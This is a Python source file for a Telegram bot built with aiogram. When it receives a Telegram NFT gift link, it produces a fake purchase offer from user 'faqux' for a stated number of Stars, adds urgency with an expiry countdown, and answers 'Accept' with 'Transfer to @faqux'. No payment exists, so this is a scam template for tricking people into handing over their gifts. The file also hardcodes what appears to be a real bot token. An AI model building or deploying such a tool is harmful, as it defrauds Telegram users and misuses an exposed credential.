import asyncio
import logging
import re

from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.enums import ParseMode

BOT_TOKEN = "8731128809:AAGKkScn9upJcg5atWJxFISR7hEhAllIRfc"
current_buyer = "faqux"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()


@dp.message()
async def any_message(message: Message):
    text = message.text or message.caption or ""
    await message.answer(f"Получил: {text[:100]}\nТвой ID: {message.from_user.id}")

    m = re.search(r't\.me/nft/([A-Za-z0-9]+)-(\d+)', text)
    if not m:
        return

    name, num = m.group(1), m.group(2)
    gift_name = re.sub(r'([a-z])([A-Z])', r'\1 \2', name)
    stars_m = re.search(r'\b(\d{3,6})\b', text)
    stars = int(stars_m.group(1)) if stars_m else 7000
    image = f"https://nft.fragment.com/gift/{name.lower()}-{num}.medium.jpg"

    caption = f"<b>User {current_buyer} is offering you\n{stars} Stars for the gift {gift_name} #{num}.</b>\n\nExpires in 5h 59m."
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="✗ Decline", callback_data="dec"),
        InlineKeyboardButton(text="✓ Accept", callback_data="acc")
    ]])

    try:
        await message.answer_photo(photo=image, caption=caption, reply_markup=kb, parse_mode=ParseMode.HTML)
    except Exception as e:
        await message.answer(caption + f"\n\nPhoto error: {e}", reply_markup=kb, parse_mode=ParseMode.HTML)


@dp.callback_query()
async def on_cb(cb: CallbackQuery):
    await cb.answer("ok")
    if cb.data == "acc":
        await cb.message.answer(f"Accepted. Transfer to @{current_buyer}")
    elif cb.data == "dec":
        await cb.message.answer("Declined")


async def main():
    print("Echo bot started")
    me = await bot.get_me()
    print(f"Running as @{me.username}")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
